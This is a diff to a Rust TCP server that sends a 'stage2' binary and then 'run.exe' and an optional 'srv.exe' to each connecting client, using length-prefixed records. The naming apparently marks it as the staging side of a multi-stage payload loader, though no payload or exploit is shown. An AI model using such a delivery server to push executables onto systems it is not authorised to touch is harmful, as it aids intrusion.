@@ -1,12 +1,14 @@
-use std::{
-    io::{Read, Write},
-    net::TcpListener,
-    path::PathBuf,
-    time::Duration,
-};
+use std::io::Read;
+use std::io::Write;
+use std::net::TcpListener;
+use std::path::PathBuf;
+use std::time::Duration;
 
-use clap::{command, Parser};
-use log::{error, info, warn};
+use clap::command;
+use clap::Parser;
+use log::error;
+use log::info;
+use log::warn;
 use simple_logger::SimpleLogger;
 
 #[derive(Parser, Debug)]
@@ -19,6 +21,16 @@ struct Args {
     /// Path to the run.exe to deliver
     #[arg(short, long)]
     run: PathBuf,
+
+    /// Path to the srv.exe to deliver
+    #[arg(short, long)]
+    srv: Option<PathBuf>,
+}
+
+#[repr(packed)]
+struct DynamicFile {
+    file_len: [u8; 4],
+    name_len: [u8; 4],
 }
 
 fn start_file_listener() {
@@ -49,7 +61,13 @@ fn main() -> std::io::Result<()> {
     }
 
     if !args.run.exists() {
-        warn!("[WARN] Provided run.exe does not exist: {:?}", &args.run);
+        warn!("[WARN] Provided run does not exist: {:?}", args.run);
+    }
+
+    if let Some(srv) = args.srv.as_ref() {
+        if !srv.exists() {
+            warn!("[WARN] Provided srv does not exist: {:?}", srv);
+        }
     }
 
     std::thread::spawn(start_file_listener);
@@ -61,7 +79,6 @@ fn main() -> std::io::Result<()> {
         info!("Connection established!");
 
         let stage2 = std::fs::read(&args.stage2)?;
-        let run = std::fs::read(&args.run)?;
         let mut stream = stream.unwrap();
 
         info!("Sending stage2 len");
@@ -69,10 +86,44 @@ fn main() -> std::io::Result<()> {
         info!("Sending stage2");
         stream.write_all(&stage2)?;
 
-        info!("Sending run.exe len");
-        stream.write_all(&(run.len() as u32).to_be_bytes())?;
-        info!("Sending run.exe");
-        stream.write_all(&run)?;
+        for (file_name, file_path) in [("run.exe", Some(&args.run)), ("srv.exe", args.srv.as_ref())]
+        {
+            if file_path.is_none() {
+                continue;
+            }
+
+            let file_path = file_path.unwrap();
+
+            info!("Sending {:?}'s metadata", file_path);
+            let file_contents = std::fs::read(file_path)?;
+            let file = DynamicFile {
+                file_len: (file_contents.len() as u32).to_be_bytes(),
+                name_len: (file_name.len() as u32).to_be_bytes(),
+            };
+            let file_as_byte_slice: &[u8] = unsafe {
+                core::slice::from_raw_parts(
+                    core::mem::transmute::<_, *const u8>(&file),
+                    core::mem::size_of_val(&file),
+                )
+            };
+
+            stream.write_all(file_as_byte_slice)?;
+            stream.write_all(file_name.as_bytes())?;
+            stream.write_all(&file_contents)?;
+        }
+
+        // Send the null terminator file
+        let file = DynamicFile {
+            file_len: [0u8; 4],
+            name_len: [0u8; 4],
+        };
+        let file_as_byte_slice: &[u8] = unsafe {
+            core::slice::from_raw_parts(
+                core::mem::transmute::<_, *const u8>(&file),
+                core::mem::size_of_val(&file),
+            )
+        };
+        stream.write_all(file_as_byte_slice)?;
 
         info!("Waiting for new connection...")
     }
